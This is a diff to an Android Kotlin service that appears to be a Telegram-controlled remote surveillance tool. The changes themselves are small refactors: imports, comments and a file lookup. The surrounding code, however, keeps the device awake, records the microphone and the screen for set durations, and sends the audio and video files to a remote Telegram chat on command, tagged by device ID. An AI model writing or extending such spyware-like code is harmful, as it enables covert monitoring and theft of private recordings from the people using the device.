@@ -19,19 +19,22 @@ import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.Executors
 import org.telegram.telegrambots.bots.TelegramLongPollingBot
+import org.telegram.telegrambots.meta.TelegramBotsApi
+import org.telegram.telegrambots.meta.api.methods.send.SendAudio
 import org.telegram.telegrambots.meta.api.methods.send.SendMessage
 import org.telegram.telegrambots.meta.api.methods.send.SendPhoto
-import org.telegram.telegrambots.meta.api.methods.send.SendAudio
 import org.telegram.telegrambots.meta.api.methods.send.SendVideo
 import org.telegram.telegrambots.meta.api.objects.InputFile
 import org.telegram.telegrambots.meta.api.objects.Update
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException
+import org.telegram.telegrambots.updatesreceivers.DefaultBotSession
 
 class BotService : Service() {
 
@@ -54,11 +57,7 @@ class BotService : Service() {
         }
 
         fun sendMessage(deviceId: String, text: String) {
-            // This is called from MainActivity to send initial data
-            // We can implement a static method to send via the bot instance
-            // But we will handle it inside the bot instance itself when it's running.
-            // We'll use a singleton pattern for the bot or use a broadcast.
-            // For simplicity, we'll just log.
+            // handled internally via bot instance
         }
     }
 
@@ -71,7 +70,7 @@ class BotService : Service() {
         prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
         powerManager = getSystemService(POWER_SERVICE) as PowerManager
         wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "BotService:WakeLock")
-        wakeLock.acquire(10*60*1000L) // 10 minutes
+        wakeLock.acquire(10*60*1000L)
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, createNotification())
         startBot()
@@ -287,8 +286,6 @@ class BotService : Service() {
                 Thread.sleep(durationSeconds * 1000L)
                 recorder.stop()
                 recorder.release()
-                // overlay device ID as text in a metadata? We'll just send the file.
-                // We could rename or add text but we'll send as is.
                 val inputFile = InputFile(file)
                 execute(SendAudio(chatId.toString(), inputFile))
             } catch (e: Exception) {
@@ -343,7 +340,6 @@ class BotService : Service() {
             screenRecordDuration = durationSeconds
             screenRecordStartTime = System.currentTimeMillis()
             sendText(chatId, "Screen recording started for $durationSeconds seconds. Use /stop to stop early.")
-            // Automatically stop after duration
             Thread {
                 Thread.sleep(durationSeconds * 1000L)
                 stopRecording(chatId, deviceId)
@@ -367,8 +363,10 @@ class BotService : Service() {
                 mediaProjection?.stop()
                 mediaProjection = null
                 isScreenRecording = false
-                // Send the video file
-                val file = File(applicationContext.cacheDir).listFiles { _, name -> name.startsWith("screen_") }?.maxByOrNull { it.lastModified() }
+                // Find the latest screen recording file
+                val dir = applicationContext.cacheDir
+                val files = dir.listFiles { _, name -> name.startsWith("screen_") }
+                val file = files?.maxByOrNull { it.lastModified() }
                 if (file != null && file.exists()) {
                     val inputFile = InputFile(file)
                     execute(SendVideo(chatId.toString(), inputFile))
